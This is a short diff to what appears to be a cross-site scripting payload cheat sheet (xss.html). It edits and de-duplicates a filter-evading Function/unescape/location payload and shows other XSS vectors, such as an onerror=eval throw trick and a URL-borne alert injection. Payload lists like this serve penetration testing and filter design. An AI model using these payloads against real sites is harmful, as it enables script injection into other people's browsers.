@@ -93,13 +93,11 @@ xss.html
  `%0aalert(/1337/)//` anywhere in the URL
 
 
-    Function`a${unescape.call`${location}`}` ``
+    Function`a${unescape.call`${location}`}```
 
     
 ---
 
-
-Function`a${unescape. call`${location}`}```
 Only Firefox [Garethheyes](https://twitter.com/garethheyes/status/1126922526796468224)
           
     {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}
